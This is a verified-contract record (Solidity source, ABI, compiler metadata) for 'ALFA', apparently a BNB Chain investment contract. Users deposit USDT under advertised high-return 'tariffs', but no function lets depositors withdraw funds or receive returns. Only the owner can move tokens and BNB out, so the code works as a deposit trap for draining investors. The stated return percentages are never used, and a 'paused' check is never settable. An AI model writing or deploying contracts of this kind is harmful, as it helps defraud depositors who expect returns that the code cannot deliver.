{"SourceCode": "// SPDX-License-Identifier: none\r\npragma solidity ^0.8.12;\r\n/**     \r\n * @title SafeMath\r\n * @dev Math operations with safety checks that throw on error\r\n */\r\nlibrary SafeMath {\r\n\r\n  /**\r\n  * @dev Multiplies two numbers, throws on overflow.\r\n  */\r\n  function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    if (a == 0) {\r\n      return 0;\r\n    }\r\n    uint256 c = a * b;\r\n    assert(c / a == b);\r\n    return c;\r\n  }\r\n  /**\r\n  * @dev Integer division of two numbers, truncating the quotient.\r\n  */\r\n  function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    // assert(b > 0); // Solidity automatically throws when dividing by 0\r\n    uint256 c = a / b;\r\n    // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n    return c;\r\n  }\r\n  /**\r\n  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).\r\n  */\r\n  function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    assert(b <= a);\r\n    return a - b;\r\n  }\r\n  /**\r\n  * @dev Adds two numbers, throws on overflow.\r\n  */\r\n  function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n    uint256 c = a + b;\r\n    assert(c >= a); \r\n    return c;\r\n  }\r\n}\r\ninterface BEP20{\r\n    function totalSupply() external view returns (uint theTotalSupply);\r\n    function balanceOf(address _owner) external view returns (uint balance);\r\n    function transfer(address _to, uint _value) external returns (bool success);\r\n    function transferFrom(address _from, address _to, uint _value) external returns (bool success);\r\n    function approve(address _spender, uint _value) external returns (bool success);\r\n    function allowance(address _owner, address _spender) external view returns (uint remaining);\r\n    event Transfer(address indexed _from, address indexed _to, uint _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint _value);\r\n}\r\ncontract Ownable {\r\n  address public owner;  \r\n  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n  constructor() {\r\n    owner = msg.sender;\r\n  }\r\n  modifier onlyOwner() {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n}\r\n\r\ninterface AggregatorV3Interface {\r\n\r\n  function decimals() external view returns (uint);\r\n  function description() external view returns (string memory);\r\n  function version() external view returns (uint);\r\n\r\n  // getRoundData and latestRoundData should both raise \"No data present\"\r\n  // if they do not have data to report, instead of returning unset values\r\n  // which could be misinterpreted as actual reported values.\r\n  function getRoundData(uint80 _roundId)\r\n    external\r\n    view\r\n    returns (\r\n      uint roundId,\r\n      uint answer,\r\n      uint startedAt,\r\n      uint updatedAt,\r\n      uint answeredInRound\r\n    );\r\n  function latestRoundData()\r\n    external\r\n    view\r\n    returns (\r\n      uint roundId,\r\n      uint answer,\r\n      uint startedAt,\r\n      uint updatedAt,\r\n      uint answeredInRound\r\n    );\r\n\r\n}\r\n\r\ncontract PriceConsumerV3 {\r\n\r\n    AggregatorV3Interface internal priceFeed;\r\n\r\n    constructor() {\r\n           priceFeed = AggregatorV3Interface(0x0567F2323251f0Aab15c8dFb1967E4e8A7D42aeE); // Mainnet BNB/USD\r\n            //priceFeed = AggregatorV3Interface(0x2514895c72f50D8bd4B4F9b1110F0D6bD2c97526); // Testnet BNB/USD\r\n    }\r\n\r\n\r\n    function getThePrice() public view returns (uint) {\r\n        (\r\n            uint roundID, \r\n            uint price,\r\n            uint startedAt,\r\n            uint timeStamp,\r\n            uint answeredInRound\r\n        ) = priceFeed.latestRoundData();\r\n        return price;\r\n    }\r\n}\r\n\r\ncontract ALFA is Ownable {   \r\n\r\n      receive() external payable {}\r\n\r\n    BEP20 token; \r\n    uint public MIN_DEPOSIT_USDT = 0 ;\r\n    address contractAddress = address(this);\r\n    PriceConsumerV3 priceConsumerV3 = new PriceConsumerV3();\r\n    bool paused;\r\n\r\n    struct Tariff {\r\n        uint time;\r\n        uint percent;\r\n    }\r\n\r\n    struct Deposit {\r\n        uint tariff;\r\n        uint amount;\r\n        uint at;\r\n    }\r\n\r\n    struct Investor {\r\n        bool registered;\r\n        Deposit[] deposits;\r\n        uint invested;\r\n        uint paidAt;\r\n        uint withdrawn;\r\n    }\r\n\r\n    mapping (address => Investor) public investors;\r\n\r\n    Tariff[] public tariffs;\r\n    uint public totalInvested;\r\n    address public contractAddr = address(this);\r\n    constructor() {\r\n        tariffs.push(Tariff(300 * 28800, 300));\r\n        tariffs.push(Tariff(35  * 28800, 157));\r\n        tariffs.push(Tariff(30  * 28800, 159));\r\n        tariffs.push(Tariff(25  * 28800, 152));\r\n        tariffs.push(Tariff(18  * 28800, 146));\r\n    }\r\n    using SafeMath for uint256;       \r\n    event TokenAddressChaged(address tokenChangedAddress);    \r\n    event DepositAt(address user, uint tariff, uint amount);    \r\n    \r\n    function withdrawalToAddress(address payable _to, address _token, uint _amount) external{\r\n        require ( paused == false , \" for now this function is paused by the devs\");\r\n        require(msg.sender == owner, \"Only owner\");\r\n        require(_amount != 0, \"Zero amount error\");\r\n        BEP20 tokenObj;\r\n        uint amount   = _amount * 10**10;\r\n        tokenObj = BEP20(_token);\r\n        tokenObj.transfer(_to, amount);\r\n    }\r\n    function transferOwnership(address _to) public {\r\n        require(msg.sender == owner, \"Only owner\");\r\n        address oldOwner  = owner;\r\n        owner = _to;\r\n        emit OwnershipTransferred(oldOwner,_to);\r\n    }\r\n    \r\n    // Set buy price decimal i.e. \r\n    function setMinBusd(uint usdtAmount) public {\r\n      require(msg.sender == owner, \"Only owner\");\r\n      MIN_DEPOSIT_USDT = usdtAmount;\r\n    }\r\n\r\n    function DepositWithUSDT(uint usdtAmount) external { \r\n            require( (usdtAmount >= (MIN_DEPOSIT_USDT*1000000000000000000)), \"Minimum limit is 0\");\r\n            BEP20 receiveToken = BEP20(0x55d398326f99059fF775485246999027B3197955);///Mainnet\r\n            uint usdtAmount = usdtAmount*1000000000000000000; \r\n            uint tariff = 0;\r\n            require(tariff < tariffs.length);\r\n            uint tokenVal = usdtAmount ; \r\n            \r\n            require(receiveToken.balanceOf(msg.sender) >= usdtAmount, \"Insufficient user balance\");\r\n            receiveToken.transferFrom(msg.sender, contractAddr, usdtAmount);\r\n            investors[msg.sender].invested += tokenVal;\r\n            totalInvested += tokenVal;\r\n            investors[msg.sender].deposits.push(Deposit(tariff, tokenVal, block.timestamp));\r\n            emit DepositAt(msg.sender, tariff, tokenVal);\r\n    \r\n    } \r\n    \r\n\r\n    function withdrawalBnb(address payable _to, uint _amount) external{\r\n        \r\n        require(msg.sender == owner, \"Only owner\");\r\n        require(_amount != 0, \"Zero amount error\");\r\n        _to.transfer(_amount);\r\n    }\r\n\r\n\r\n  \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"user\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tariff\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"DepositAt\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"tokenChangedAddress\",\"type\":\"address\"}],\"name\":\"TokenAddressChaged\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"usdtAmount\",\"type\":\"uint256\"}],\"name\":\"DepositWithUSDT\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"MIN_DEPOSIT_USDT\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractAddr\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"investors\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"registered\",\"type\":\"bool\"},{\"internalType\":\"uint256\",\"name\":\"invested\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"paidAt\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"withdrawn\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"usdtAmount\",\"type\":\"uint256\"}],\"name\":\"setMinBusd\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"tariffs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"time\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"percent\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalInvested\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_to\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawalBnb\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"_to\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"withdrawalToAddress\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "ALFA", "CompilerVersion": "v0.8.18+commit.87f61d96", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://62682b7efee864824de5b8a910989b0800e5c0e70772704eb77d642dfc7e6c17"}